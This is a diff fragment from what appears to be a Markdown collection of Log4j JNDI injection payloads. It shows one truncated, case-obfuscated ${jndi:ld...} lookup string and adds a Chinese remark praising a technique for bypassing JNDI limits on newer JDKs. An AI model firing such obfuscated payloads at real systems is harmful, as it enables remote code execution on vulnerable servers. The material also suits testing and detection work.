@@ -365,5 +365,7 @@ ${j${lower:${lower:${lower:${lower:n}}}}d${upper:${lower:${upper:i}}}:l${lower:d
 
 
 
+* JNDI在高版本的JDK绕过，综合了 （乌云最帅 没有之一）浅蓝 老板的姿势，很赞*
+
 ```
 
